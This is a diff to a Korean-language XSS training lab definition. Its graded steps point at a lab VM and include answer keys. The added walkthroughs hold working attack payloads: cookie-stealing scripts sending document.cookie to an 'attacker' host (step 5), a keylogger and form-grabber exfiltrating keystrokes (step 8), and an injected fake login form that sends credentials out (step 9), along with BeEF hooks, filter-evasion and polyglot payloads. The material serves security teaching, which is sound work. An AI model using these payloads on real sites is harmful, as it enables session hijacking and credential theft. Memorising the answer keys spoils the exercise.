@@ -13,8 +13,54 @@ objectives:
 pass_threshold: 0.6
 steps:
 - order: 1
-  instruction: 대상 웹 애플리케이션(http://{{WEB_IP}})의 검색 기능에서 반사형 XSS를 테스트하시오.
-  hint: URL 파라미터에 script 태그를 삽입하세요.
+  instruction: |-
+    대상 웹 애플리케이션(http://{{WEB_IP}})의 검색 기능에서 반사형 XSS를 테스트하시오.
+
+    ■ 실습 방법 (4 도구로 Reflected XSS)
+
+    ▶ 1단계: 도구 A — curl 수동 페이로드 (응답 반사 확인)
+    ```bash
+    PAYLOAD='<script>alert(1)</script>'
+    ENCODED=$(printf '%s' "$PAYLOAD" | jq -sRr @uri)
+    curl -s "http://10.20.30.80/#/search?q=$ENCODED" | grep -oE '<script>[^<]*</script>' | head -3
+    echo "반사형 XSS 테스트 완료"
+    ```
+    응답 본문에 `<script>alert(1)</script>` 가 그대로 보이면 → 인코딩 안된 reflection = XSS 취약.
+
+    ▶ 2단계: 도구 B — XSStrike (가장 종합 XSS scanner)
+    설치 (이미 ~/XSStrike): `python3 ~/XSStrike/xsstrike.py`. 사용:
+    ```bash
+    cd ~/XSStrike
+    python3 xsstrike.py -u "http://10.20.30.80/#/search?q=test" --params --crawl
+    # --params: 파라미터 자동 fuzz
+    # --crawl: 사이트 크롤링 후 발견된 모든 entry 점검
+    ```
+    출력 예 (취약 시):
+    ```
+    [+] Vulnerable webpage: http://10.20.30.80/#/search
+    [+] Vector for q: <SvG/onLoaD=confirm(1)>
+    [+] Efficiency: 100
+    [+] Confidence: 10
+    ```
+
+    ▶ 3단계: 도구 C — dalfox (Go 기반, 빠름)
+    설치: `sudo apt install dalfox` 또는 `go install github.com/hahwul/dalfox/v2@latest`. 사용:
+    ```bash
+    dalfox url "http://10.20.30.80/#/search?q=test" --mining-dom --mining-dict
+    # 자동 파라미터 발견 + DOM XSS + 사전 기반 페이로드
+    # 또는 STDIN 으로 다수 URL
+    cat urls.txt | dalfox pipe
+    ```
+
+    ▶ 4단계: 도구 D — Burp Suite Active Scan (GUI, 가장 정밀)
+    1. Burp Proxy → Intercept → /search?q=test 요청 캡처
+    2. 우클릭 → **Send to Active Scan**
+    3. Issue 패널에서 "Cross-site scripting (reflected)" 확인
+    4. 우클릭 → **Show response in browser** 으로 시각 검증
+
+    ▶ 5단계: 답변
+    각 도구 출력 (XSStrike "Vulnerable webpage" / dalfox "[POC] ..." / Burp "Reflected XSS" 등) 1줄 quote + payload + reflection 위치.
+  hint: 'curl 수동 / XSStrike --crawl 종합 / dalfox 빠름 / Burp Active Scan GUI.'
   category: xss_reflected
   points: 8
   answer: curl -s 'http://10.20.30.80/#/search?q=<script>alert(1)</script>' 2>/dev/null
@@ -41,8 +87,59 @@ steps:
       - 반사형 맥락 없음
   target_vm: attacker
 - order: 2
-  instruction: '다양한 XSS 페이로드를 테스트하시오: img, svg, iframe 태그 활용.'
-  hint: HTML 이벤트 핸들러를 사용하세요.
+  instruction: |-
+    다양한 XSS 페이로드를 테스트하시오: img, svg, iframe 태그 활용.
+
+    ■ 실습 방법 (페이로드 다양성)
+
+    ▶ 1단계: 도구 A — curl 다양 페이로드 batch
+    ```bash
+    PAYLOADS=(
+      '<img src=x onerror=alert(1)>'
+      '<svg onload=alert(1)>'
+      '<iframe src="javascript:alert(1)">'
+      '<body onload=alert(1)>'
+      '<details open ontoggle=alert(1)>'
+      '<input autofocus onfocus=alert(1)>'
+      '<a href="javascript:alert(1)">click</a>'
+      '<marquee onstart=alert(1)>'
+      '<video><source onerror=alert(1)>'
+      '<audio src=x onerror=alert(1)>'
+    )
+    for p in "${PAYLOADS[@]}"; do
+      ENC=$(printf '%s' "$p" | jq -sRr @uri)
+      echo "=== $p ==="
+      curl -s "http://10.20.30.80/#/search?q=$ENC" | grep -F "$p" | head -1
+    done
+    echo "XSS 페이로드 테스트 완료"
+    ```
+
+    ▶ 2단계: 도구 B — PayloadsAllTheThings (학습용 wordlist)
+    ```bash
+    git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git ~/PATT
+    # XSS 페이로드 wordlist
+    cat ~/PATT/XSS\ Injection/Intruders/IntrudersXSS.txt | head -30
+    ```
+
+    ▶ 3단계: 도구 C — XSStrike fuzzing 모드
+    ```bash
+    cd ~/XSStrike
+    python3 xsstrike.py -u "http://10.20.30.80/#/search?q=test" --fuzzer
+    # 자체 fuzzer 가 600+ 페이로드 시도
+    ```
+
+    ▶ 4단계: 도구 D — OWASP XSS Filter Evasion Cheatsheet
+    https://owasp.org/www-community/xss-filter-evasion-cheatsheet
+    카테고리:
+    - 이벤트 핸들러 (onerror/onload/onfocus/onclick/...)
+    - JavaScript URI (javascript:/data:)
+    - HTML5 새 태그 (details/summary/marquee/audio/video)
+    - SVG / MathML
+    - 인코딩 (HTML entity / URL / Unicode / hex)
+
+    ▶ 5단계: 답변
+    성공한 페이로드 2~3개 + 응답에서 반사된 코드 quote + 카테고리 분류 (이벤트 핸들러/URI/HTML5).
+  hint: 'curl batch / PayloadsAllTheThings / XSStrike --fuzzer / OWASP XSS Cheatsheet.'
   category: xss_reflected
   points: 10
   answer: curl -s 'http://10.20.30.80/#/search?q=<img src=x onerror=alert(1)>' 2>/dev/null
@@ -69,8 +166,59 @@ steps:
       - 변형 페이로드 누락
   target_vm: attacker
 - order: 3
-  instruction: '저장형 XSS를 시도하시오: 상품 리뷰에 스크립트를 삽입.'
-  hint: POST 요청으로 리뷰를 등록하세요.
+  instruction: |-
+    저장형 XSS를 시도하시오: 상품 리뷰에 스크립트를 삽입.
+
+    ■ 실습 방법 (Stored XSS — 2 단계: 저장 + 트리거)
+
+    ▶ 1단계: 도구 A — curl 2 단계 (저장 → 다른 사용자 시점 재현)
+    ```bash
+    # 1. 인증 토큰 얻기
+    TOKEN=$(curl -s -X POST http://10.20.30.80/rest/user/login \
+      -H 'Content-Type: application/json' \
+      -d '{"email":"jim@juice-sh.op","password":"ncc-1701"}' | jq -r '.authentication.token')
+    echo "TOKEN: $TOKEN"
+
+    # 2. 페이로드 저장 (리뷰 작성)
+    curl -s -X PUT http://10.20.30.80/rest/products/1/reviews \
+      -H "Authorization: Bearer $TOKEN" \
+      -H 'Content-Type: application/json' \
+      -d '{"message":"<script>alert(\"stored XSS\")</script>","author":"hacker@x.com"}'
+
+    # 3. 다른 사용자가 페이지 보면 트리거 (다시 GET)
+    curl -s "http://10.20.30.80/rest/products/1/reviews" | jq '.data[].message' | head -5
+    echo "저장형 XSS 테스트 완료"
+    ```
+
+    ▶ 2단계: 도구 B — XSStrike --crawl (사이트 전체 stored XSS 자동 점검)
+    ```bash
+    cd ~/XSStrike
+    python3 xsstrike.py -u "http://10.20.30.80" --crawl --headers "Authorization: Bearer $TOKEN"
+    ```
+
+    ▶ 3단계: 도구 C — dalfox + Stored XSS 모드
+    ```bash
+    dalfox url "http://10.20.30.80/rest/products/1/reviews" \
+           --method PUT \
+           --header "Authorization: Bearer $TOKEN" \
+           --data '{"message":"PAYLOAD"}' \
+           --custom-payload ~/XSStrike/db/jsBuilders.txt
+    ```
+
+    ▶ 4단계: 도구 D — XSS Hunter (out-of-band stored XSS 탐지)
+    설치: 자체 호스팅 또는 https://xsshunter.com 가입 후 ID 발급. 사용:
+    ```bash
+    # 페이로드: <script src=https://YOUR_ID.xss.ht></script>
+    # 또는 OOB blind XSS:
+    curl -s -X PUT http://10.20.30.80/rest/products/1/reviews \
+      -H "Authorization: Bearer $TOKEN" \
+      -d '{"message":"<script src=https://yoursubdomain.xss.ht></script>"}'
+    # 관리자가 페이지 열면 → XSS Hunter 가 쿠키/screenshot/URL 자동 수집
+    ```
+
+    ▶ 5단계: 답변
+    저장 응답 + 재요청 응답에 페이로드 그대로 노출 1줄 quote + Stored vs Reflected 차이 1 문장.
+  hint: 'curl 2 단계 / XSStrike --crawl 자동 / dalfox PUT / XSS Hunter blind OOB.'
   category: xss_stored
   points: 12
   answer: "curl -s -X POST http://10.20.30.80/api/Feedbacks \\\n  -H 'Content-Type:\
@@ -100,8 +248,56 @@ steps:
       - 다른 사용자 영향 누락
   target_vm: attacker
 - order: 4
-  instruction: DOM 기반 XSS 취약점을 찾으시오.
-  hint: JavaScript 소스에서 innerHTML, document.write, eval 등을 검색하세요.
+  instruction: |-
+    DOM 기반 XSS 취약점을 찾으시오.
+
+    ■ 실습 방법 (DOM XSS — 클라이언트 JS 분석)
+
+    ▶ 1단계: 도구 A — curl + grep (DOM sink 정적 분석)
+    ```bash
+    # 위험 sinks 검색
+    curl -s http://10.20.30.80 | grep -ioE '(innerHTML|outerHTML|document\.write|eval\(|setTimeout\(.*[a-z]|location\.(hash|href)|window\.name)' | sort -u
+    echo "DOM XSS 분석 완료"
+    ```
+    위험 sinks 카테고리:
+    - **HTML injection**: `innerHTML`, `outerHTML`, `document.write`, `insertAdjacentHTML`
+    - **JS execution**: `eval`, `setTimeout(string)`, `setInterval(string)`, `Function()`
+    - **URL**: `location.href`, `location.hash`, `location.search`
+    - **Storage**: `localStorage`, `sessionStorage` 의 unsanitized 사용
+
+    ▶ 2단계: 도구 B — XSStrike --dom 모드
+    ```bash
+    cd ~/XSStrike
+    python3 xsstrike.py -u "http://10.20.30.80/#/track-result?id=1" --dom
+    # DOM XSS 만 점검 (서버 응답 X, 클라이언트 JS 분석)
+    ```
+
+    ▶ 3단계: 도구 C — Chrome DevTools (수동 분석, GUI)
+    1. http://10.20.30.80 접속
+    2. F12 → **Sources** 탭
+    3. JavaScript 파일에서 `Ctrl+F` → `innerHTML` / `eval` 검색
+    4. **Sources → Event Listener Breakpoints** → DOM Mutation 에서 중단
+    5. **Network → Initiator** → 어떤 JS 가 어떤 요청을 시작했는지 추적
+
+    ▶ 4단계: 도구 D — DOMinator / RetireJS (자동 정적 분석)
+    ```bash
+    # RetireJS — 알려진 취약 JS 라이브러리 + DOM XSS
+    npm install -g retire
+    retire --js --jspath /path/to/static/js/
+
+    # 또는 Snyk Code (Open Source)
+    snyk code test
+    ```
+
+    ▶ 5단계: 도구 E — dalfox --mining-dom
+    ```bash
+    dalfox url "http://10.20.30.80/#/search?q=test" --mining-dom
+    # URL fragment(#) 내 DOM 파라미터 자동 분석
+    ```
+
+    ▶ 6단계: 답변
+    DOM sink (예: `target.innerHTML = location.hash.slice(1)`) 1줄 quote + 위험 분류 + 방어 (textContent / DOMPurify) 1 문장.
+  hint: 'curl + grep sink / XSStrike --dom / DevTools breakpoint / RetireJS 라이브러리 / dalfox --mining-dom.'
   category: xss_dom
   points: 10
   answer: curl -s http://10.20.30.80 | grep -ioE '(innerHTML|document\.write|eval\()'
@@ -128,8 +324,73 @@ steps:
       - sink 분석 없음
   target_vm: attacker
 - order: 5
-  instruction: XSS로 쿠키를 탈취하는 페이로드를 작성하시오.
-  hint: document.cookie를 외부로 전송하는 스크립트를 작성하세요.
+  instruction: |-
+    XSS로 쿠키를 탈취하는 페이로드를 작성하시오.
+
+    ■ 실습 방법 (Cookie Stealer 페이로드 + 수신 환경)
+
+    ▶ 1단계: 수신 서버 준비 (학습용 mock)
+    ```bash
+    # Python 간이 서버 (attacker VM 에서)
+    python3 -m http.server 9999 &
+    # 또는 더 명확한 로깅
+    python3 -c "
+    from http.server import HTTPServer, BaseHTTPRequestHandler
+    class H(BaseHTTPRequestHandler):
+        def do_GET(self):
+            print(f'STOLEN: {self.path}')
+            self.send_response(200); self.end_headers()
+    HTTPServer(('0.0.0.0', 9999), H).serve_forever()
+    " &
+    ```
+    또는 **무료 webhook 서비스**:
+    - **webhook.site** — https://webhook.site 가입 → unique URL 발급 → 모든 요청 자동 캡처
+    - **requestbin.com** — 동등 기능
+    - **interactsh** — projectdiscovery, OOB blind 전용
+
+    ▶ 2단계: 페이로드 작성 (다양한 전송 방식)
+    ```javascript
+    // 방식 1 — Image (가장 단순, GET, 응답 안 받음)
+    <script>new Image().src="http://10.20.30.201:9999/steal?c="+encodeURIComponent(document.cookie)</script>
+
+    // 방식 2 — fetch (응답 받기 가능)
+    <script>fetch('http://attacker:9999/steal?c='+document.cookie)</script>
+
+    // 방식 3 — beacon API (페이지 닫혀도 전송)
+    <script>navigator.sendBeacon('http://attacker:9999/steal',document.cookie)</script>
+
+    // 방식 4 — WebSocket (양방향, BeEF 같은 C2)
+    <script>new WebSocket('ws://attacker:9999/').onopen=function(){this.send(document.cookie)}</script>
+
+    // 방식 5 — DNS exfil (interactsh — 외부 출구만 있어도 OK)
+    <script>fetch('http://'+btoa(document.cookie)+'.YOUR.interactsh.com')</script>
+    ```
+
+    ▶ 3단계: 도구 A — BeEF (XSS C2 framework, GUI)
+    설치:
+    ```bash
+    # Docker (권장)
+    docker run -p 3000:3000 beefproject/beef
+    # 또는 git clone https://github.com/beefproject/beef && ./beef
+    ```
+    사용:
+    1. http://attacker:3000/ui/panel (admin/beef)
+    2. Hook URL 복사: `<script src="http://attacker:3000/hook.js"></script>`
+    3. 피해자 브라우저에 hook 발동 → 1300+ 모듈 (cookie/keylogger/proxy/social) 사용 가능
+
+    ▶ 4단계: 방어 검증
+    ```bash
+    # HttpOnly 플래그 있으면 document.cookie 접근 X
+    curl -sI http://10.20.30.80/ | grep -i 'set-cookie' | grep -i 'httponly'
+    # 출력: Set-Cookie: token=xxx; HttpOnly; Secure; SameSite=Lax
+    ```
+    **방어**: HttpOnly + Secure + SameSite=Strict + CSP `script-src 'self'`.
+
+    ▶ 5단계: 답변
+    페이로드 1개 quote + 수신 서버 로그 (`STOLEN: /steal?c=...`) quote + HttpOnly 방어.
+
+    **윤리**: 점검 환경 only. 실 사용자 쿠키 탈취는 형법 (정보통신망법 제48조) 위반.
+  hint: 'mock 서버 (python -m http.server) / webhook.site / Image/fetch/beacon/WebSocket/DNS / BeEF C2 framework.'
   category: xss_exploit
   points: 10
   answer: echo '<script>new Image().src="http://10.20.30.1:9999/steal?c="+document.cookie</script>'
@@ -156,8 +417,71 @@ steps:
       - HttpOnly 방어 누락
   target_vm: attacker
 - order: 6
-  instruction: 'XSS 필터 우회 기법을 테스트하시오: 인코딩, 대소문자 혼합.'
-  hint: HTML 엔티티, URL 인코딩을 활용하세요.
+  instruction: |-
+    XSS 필터 우회 기법을 테스트하시오: 인코딩, 대소문자 혼합.
+
+    ■ 실습 방법 (필터 우회 종합)
+
+    ▶ 1단계: 5 카테고리 우회 페이로드
+    ```bash
+    # 1. 대소문자 혼합 (블랙리스트가 'script' 만 차단 시)
+    PAYLOAD1='<ScRiPt>alert(1)</sCrIpT>'
+
+    # 2. HTML 엔티티 인코딩
+    PAYLOAD2='&#60;script&#62;alert(1)&#60;/script&#62;'  # &#60; = <
+    PAYLOAD3='&lt;svg/onload=alert(1)&gt;'
+
+    # 3. URL 인코딩
+    PAYLOAD4='%3Cscript%3Ealert(1)%3C%2Fscript%3E'
+
+    # 4. Unicode escape (브라우저 자동 디코드)
+    PAYLOAD5='<script>alert(1)</script>'
+
+    # 5. 이중 인코딩 (WAF 1차 해독 후 통과)
+    PAYLOAD6='%253Cscript%253Ealert(1)%253C%252Fscript%253E'
+
+    # 6. JavaScript URI scheme
+    PAYLOAD7='<a href="javascript:&#97;lert(1)">click</a>'
+
+    for p in "$PAYLOAD1" "$PAYLOAD4" "$PAYLOAD5" "$PAYLOAD6" "$PAYLOAD7"; do
+      echo "=== $p ==="
+      curl -s "http://10.20.30.80/#/search?q=$p" | grep -F 'alert' | head -1
+    done
+    echo "XSS 우회 기법 테스트 완료"
+    ```
+
+    ▶ 2단계: 도구 A — XSStrike WAF 자동 우회
+    ```bash
+    cd ~/XSStrike
+    python3 xsstrike.py -u "http://10.20.30.80/#/search?q=test" --skip-poc --crawl
+    # 자체 WAF 식별 + 우회 페이로드 자동 생성
+    ```
+
+    ▶ 3단계: 도구 B — dalfox + custom-payload + WAF 모드
+    ```bash
+    # WAF evasion 모드
+    dalfox url "http://10.20.30.80/#/search?q=test" \
+           --waf-evasion \
+           --custom-payload ~/XSStrike/db/JhaddixGood.txt \
+           --param q
+    ```
+
+    ▶ 4단계: 도구 C — BurpBounty (Burp 확장, 우회 페이로드 자동)
+    Burp Suite → Extensions → BApp Store → "Burp Bounty" 설치.
+    내장 XSS 우회 프로파일로 자동 점검.
+
+    ▶ 5단계: 도구 D — wfuzz + 인코딩 처리
+    ```bash
+    wfuzz -c -u "http://10.20.30.80/#/search?q=FUZZ" \
+          -w ~/XSStrike/db/JhaddixGood.txt \
+          --hh 12345 \
+          -z list,raw-urlencode-percentencode-double-percentencode
+    # -z list,raw=원본/urlencode=URL인코딩/...: 다양한 인코딩 자동
+    ```
+
+    ▶ 6단계: 답변
+    우회 카테고리 별 1개씩 페이로드 + 1개 응답 quote + "블랙리스트 한계 → 화이트리스트(DOMPurify) 권장" 1 문장.
+  hint: '대소문자/엔티티/URL/Unicode/이중인코딩 / XSStrike --skip-poc / dalfox --waf-evasion / wfuzz 인코딩.'
   category: xss_bypass
   points: 12
   answer: 'echo ''대소문자: <ScRiPt>alert(1)</sCrIpT>'' && echo ''HTML 엔티티: &#60;script&#62;''
@@ -184,8 +508,60 @@ steps:
       - 블랙리스트 한계 맥락 없음
   target_vm: attacker
 - order: 7
-  instruction: Content-Security-Policy(CSP) 헤더를 분석하시오.
-  hint: 응답 헤더에서 CSP를 확인하세요.
+  instruction: |-
+    Content-Security-Policy(CSP) 헤더를 분석하시오.
+
+    ■ 실습 방법 (CSP 분석 + 우회 도구)
+
+    ▶ 1단계: 도구 A — curl + grep (CSP 헤더 확인)
+    ```bash
+    curl -sI http://10.20.30.80 | grep -i 'content-security-policy'
+    # 또는 페이지 내 meta 태그 (HTTP 헤더 외 fallback)
+    curl -s http://10.20.30.80 | grep -ioE 'content-security-policy[^"]*"[^"]*"' | head -3
+    echo "CSP 분석 완료"
+    ```
+    출력 예 (정상):
+    ```
+    Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'; img-src https:;
+    ```
+
+    ▶ 2단계: 도구 B — Google CSP Evaluator (웹 GUI)
+    https://csp-evaluator.withgoogle.com/
+    1. CSP 헤더 값 paste
+    2. 자동 등급 평가 + 위험 directive 식별
+    3. `unsafe-inline` / `unsafe-eval` / `*` / `data:` 등 위험 옵션 자동 경고
+
+    ▶ 3단계: 도구 C — Mozilla Observatory (CLI/Web)
+    ```bash
+    # CLI
+    pip install httpobs-cli
+    httpobs-cli http://10.20.30.80
+    # 또는 web https://observatory.mozilla.org/
+    ```
+    A+ ~ F 등급 + CSP 외 모든 보안 헤더 종합 평가.
+
+    ▶ 4단계: 도구 D — CSP bypass payload (csp.js / sansec)
+    ```bash
+    # JSONP endpoint 검색 (Google/Twitter API 활용한 우회)
+    curl -s "https://accounts.google.com/o/oauth2/revoke?callback=alert" | head -3
+    # 'unsafe-inline' 없어도 JSONP allow 시 우회 가능
+
+    # nonce 누출 검색 (HTML 소스에서 nonce 가 보이면 stored XSS 시 사용 가능)
+    curl -s http://10.20.30.80 | grep -oE 'nonce="[^"]+"' | head -3
+    ```
+
+    ▶ 5단계: CSP directive 위험도 표
+    | Directive | 안전 | 위험 |
+    |---|---|---|
+    | `default-src` | `'self'` / `'none'` | `*` |
+    | `script-src` | `'self'` + `'nonce-...'` | `'unsafe-inline'` / `'unsafe-eval'` / `*` |
+    | `style-src` | `'self'` | `'unsafe-inline'` |
+    | `connect-src` | 명시 origin | `*` |
+    | `frame-ancestors` | `'none'` | (누락 → 클릭재킹) |
+
+    ▶ 6단계: 답변
+    CSP 헤더 quote + Google CSP Evaluator 등급 + 위험 directive 1개 매핑.
+  hint: 'curl -I CSP / Google CSP Evaluator / Mozilla Observatory / nonce 누출 / JSONP 우회.'
   category: xss_defense
   points: 10
   answer: curl -sI http://10.20.30.80 | grep -i 'content-security-policy' && echo
@@ -212,7 +588,54 @@ steps:
       - nonce/hash 맥락 없음
   target_vm: attacker
 - order: 8
-  instruction: XSS를 이용한 키로거 시뮬레이션 페이로드를 작성하시오.
+  instruction: |-
+    XSS를 이용한 키로거 시뮬레이션 페이로드를 작성하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 키로거 페이로드 (JavaScript)
+    ```javascript
+    // 모든 키 입력 캡처 + 외부 전송
+    <script>
+    let buf=[];
+    document.addEventListener('keydown', e => {
+      buf.push(e.key);
+      if (buf.length >= 10) {
+        new Image().src='http://attacker:9999/log?k='+encodeURIComponent(buf.join(''));
+        buf = [];
+      }
+    });
+    </script>
+    ```
+    또는 form 제출 시 가로채기:
+    ```javascript
+    <script>
+    document.querySelectorAll('form').forEach(f =>
+      f.addEventListener('submit', e => {
+        new Image().src='http://attacker:9999/form?d='+encodeURIComponent(new FormData(f).toString());
+      })
+    );
+    </script>
+    ```
+
+    ▶ 2단계: 도구 A — BeEF Keylogger 모듈 (GUI)
+    BeEF (이전 step 5 설치). 사용:
+    1. Hooked Browsers 패널 → 피해자 선택
+    2. **Commands → Browser → Hooked Domain → Get Form Values** (실시간)
+    3. **Commands → Persistence → Backdoor Iframe** (영구 hook)
+
+    ▶ 3단계: 도구 B — XSS Hunter Express (자체 호스팅)
+    ```bash
+    docker run -d --name xsshunter -p 8080:8080 mandatoryprogrammer/xsshunter_express
+    # 페이로드: <script src=//yourdomain.com/payload.js></script>
+    # 자동: 쿠키 + localStorage + DOM + screenshot 모두 수집
+    ```
+
+    ▶ 4단계: 답변
+    keylogger payload + 수신 로그 1줄 quote + 방어 (CSP `default-src 'self'`) 1 문장.
+
+    **윤리**: 점검 환경 only. 실 사용자 키 입력 캡처는 *통신비밀보호법 위반*.
+  hint: 'JS keylogger payload / BeEF Get Form Values / XSS Hunter screenshot+cookie 자동.'
   hint: addEventListener로 키 입력을 캡처하세요.
   category: xss_exploit
   points: 10
@@ -241,8 +664,52 @@ steps:
       - 외부 전송 없음
   target_vm: attacker
 - order: 9
-  instruction: XSS를 이용한 피싱 페이지 삽입을 시뮬레이션하시오.
-  hint: innerHTML로 가짜 로그인 폼을 삽입하세요.
+  instruction: |-
+    XSS를 이용한 피싱 페이지 삽입을 시뮬레이션하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 피싱 페이로드 (가짜 로그인 폼 삽입)
+    ```javascript
+    <script>
+    document.body.innerHTML = `
+      <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999">
+        <h2>Session Expired - Please Re-login</h2>
+        <form id="phish">
+          <input name="user" placeholder="Email"><br>
+          <input name="pass" type="password" placeholder="Password"><br>
+          <button>Login</button>
+        </form>
+      </div>`;
+    document.getElementById('phish').onsubmit = function(e){
+      e.preventDefault();
+      const data = new FormData(this);
+      fetch('http://attacker:9999/phish?u='+encodeURIComponent(data.get('user'))+'&p='+encodeURIComponent(data.get('pass')));
+      // 실제 로그인 페이지로 redirect (의심 회피)
+      window.location='/login';
+    };
+    </script>
+    ```
+
+    ▶ 2단계: 도구 A — BeEF "Pretty Theft" 모듈 (GUI)
+    BeEF (이전 step). 사용:
+    1. Hooked Browser → **Commands → Social Engineering → Pretty Theft**
+    2. Dialog Type: Facebook/LinkedIn/Twitter/Generic 선택
+    3. Execute → 피해자 화면에 가짜 로그인 popup
+    4. 자격증명 자동 BeEF 로 전송
+
+    ▶ 3단계: 도구 B — Gophish (대량 피싱 캠페인 — 합법 점검만)
+    설치: https://github.com/gophish/gophish/releases. 사용:
+    1. admin UI 접속
+    2. Templates → 가짜 로그인 페이지 작성
+    3. Sending Profile → SMTP 설정
+    4. Campaign 시작 → 클릭률/입력률 통계
+
+    ▶ 4단계: 답변
+    페이로드 1줄 + 수신 로그 quote + 방어: Subresource Integrity / CSP `frame-ancestors 'none'` / X-Frame-Options DENY.
+
+    **윤리**: 점검 환경 only. 실 피싱은 *통신비밀보호법 + 형법 사기죄*.
+  hint: 'JS innerHTML 가짜 폼 / BeEF Pretty Theft GUI / Gophish 대량 캠페인 (합법 only).'
   category: xss_exploit
   points: 10
   answer: 'echo ''피싱 페이로드: document.body.innerHTML에 가짜 로그인 폼 삽입'' && echo ''피싱 페이로드
@@ -269,8 +736,59 @@ steps:
       - 도메인 신뢰 맥락 없음
   target_vm: attacker
 - order: 10
-  instruction: JavaScript 프레임워크별 XSS 벡터를 분석하시오.
-  hint: Angular, React 등의 XSS 벡터를 정리하세요.
+  instruction: |-
+    JavaScript 프레임워크별 XSS 벡터를 분석하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 도구 A — RetireJS (라이브러리 버전 + 알려진 CVE)
+    ```bash
+    npm install -g retire
+    retire --js --jspath ./src/
+    # 출력 예:
+    # angular 1.5.0 has known vulnerabilities: CVE-2019-10768
+    ```
+
+    ▶ 2단계: 프레임워크별 XSS 벡터 정리
+    | 프레임워크 | 위험 함수 | 예시 |
+    |---|---|---|
+    | **Angular** | 템플릿 인젝션 | `{{constructor.constructor('alert(1)')()}}` |
+    | **Angular** | bypassSecurityTrust* | `DomSanitizer.bypassSecurityTrustHtml(input)` |
+    | **React** | dangerouslySetInnerHTML | `<div dangerouslySetInnerHTML={{__html: input}}/>` |
+    | **Vue.js** | v-html | `<div v-html="input"></div>` |
+    | **Svelte** | {@html} | `{@html input}` |
+    | **Lit** | unsafeHTML | `html\`${unsafeHTML(input)}\`` |
+    | **Handlebars** | triple-stash | `{{{input}}}` (vs `{{input}}`) |
+    | **EJS** | <%- %> | `<%- input %>` (vs `<%= input %>`) |
+
+    ▶ 3단계: 도구 B — semgrep (각 프레임워크 룰)
+    ```bash
+    pip install semgrep
+    # React 전용
+    semgrep --config p/react ./src
+    # Angular 전용
+    semgrep --config p/javascript ./src
+    # XSS 일반
+    semgrep --config p/xss ./src
+    ```
+
+    ▶ 4단계: 도구 C — eslint-plugin-security
+    ```bash
+    npm install --save-dev eslint-plugin-security
+    # .eslintrc 에 plugin:security/recommended 추가
+    npx eslint ./src --ext .js,.jsx,.ts,.tsx
+    ```
+    `detect-object-injection` / `detect-eval-with-expression` 등 자동 탐지.
+
+    ▶ 5단계: Angular 템플릿 인젝션 PoC
+    ```bash
+    # AngularJS (legacy) 1.x — 클라이언트 sandbox escape
+    curl -s "http://10.20.30.80/?msg={{constructor.constructor('alert(1)')()}}"
+    ```
+
+    ▶ 6단계: 답변
+    프레임워크 별 위험 함수 1줄씩 quote + RetireJS / semgrep 출력 1줄 + 안전 alternative (textContent / DOMPurify).
+  hint: 'RetireJS 라이브러리 / 프레임워크별 위험 함수 표 / semgrep p/react p/xss / eslint-plugin-security.'
   category: xss_advanced
   points: 10
   answer: 'echo ''=== 프레임워크별 XSS ==='' && echo ''Angular: 템플릿 인젝션'' && echo ''React:
@@ -298,8 +816,51 @@ steps:
       - 안전 기본값 맥락 없음
   target_vm: attacker
 - order: 11
-  instruction: XSS Polyglot 페이로드를 작성하시오.
-  hint: 여러 컨텍스트에서 동작하는 범용 페이로드를 만드세요.
+  instruction: |-
+    XSS Polyglot 페이로드를 작성하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 유명 Polyglot 페이로드 모음
+    ```text
+    # Mathias Bynens 의 polyglot (HTML+JS+CSS context 모두 동작)
+    jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
+    # 0xsobky polyglot (https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)
+    jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
+    # 짧은 polyglot
+    "><img src=x onerror=alert(1)>
+    '><script>alert(1)</script>
+    `;alert(1);//
+    ```
+
+    ▶ 2단계: 도구 A — PortSwigger XSS Cheatsheet (대화형)
+    https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+    - 모든 태그 / 이벤트 / context 별 페이로드 검색 가능
+    - 브라우저 별 (Chrome/Firefox/Safari/Edge) 호환성 표시
+
+    ▶ 3단계: 도구 B — XSS Hunter Polyglot Generator
+    XSS Hunter 의 internal polyglot 생성기.
+
+    ▶ 4단계: 도구 C — wfuzz + polyglot 사전
+    ```bash
+    # PayloadsAllTheThings 의 polyglot 모음
+    wfuzz -c -u "http://10.20.30.80/?q=FUZZ" \
+          -w ~/PATT/XSS\ Injection/Intruders/IntrudersXSS.txt \
+          --hh 12345
+    ```
+
+    ▶ 5단계: Polyglot 작성 원칙
+    1. HTML 태그 시작 시 빠져나오기 (`">` / `'>` 시도)
+    2. JS 문자열 빠져나오기 (`'` `"` `\``)
+    3. 주석으로 뒤따르는 코드 무시 (`//` / `/* */`)
+    4. 다양한 이벤트 (`onerror` / `onload` / `onclick`)
+    5. 인코딩 변형 (`%0a` / `\n` 줄바꿈 활용)
+
+    ▶ 6단계: 답변
+    Polyglot 페이로드 1개 quote + 동작 context 분석 (HTML attr / JS string / textarea) + 도구 활용.
+  hint: 'Mathias polyglot / 0xsobky / PortSwigger Cheatsheet / wfuzz + PayloadsAllTheThings.'
   category: xss_advanced
   points: 10
   answer: 'echo ''Polyglot: 여러 HTML/JS 컨텍스트에서 실행 가능한 페이로드'' && echo ''Polyglot 작성
@@ -326,8 +887,59 @@ steps:
       - 단순 페이로드
   target_vm: attacker
 - order: 12
-  instruction: 자동화된 XSS 스캐닝을 수행하시오.
-  hint: XSS 페이로드 목록을 사용하세요.
+  instruction: |-
+    자동화된 XSS 스캐닝을 수행하시오.
+
+    ■ 실습 방법 (5 자동 스캐너 비교)
+
+    ▶ 1단계: 도구 A — XSStrike (Python, 가장 종합)
+    ```bash
+    cd ~/XSStrike
+    python3 xsstrike.py -u "http://10.20.30.80" --crawl --skip-dom \
+            --proxy --threads 5 --timeout 5
+    ```
+
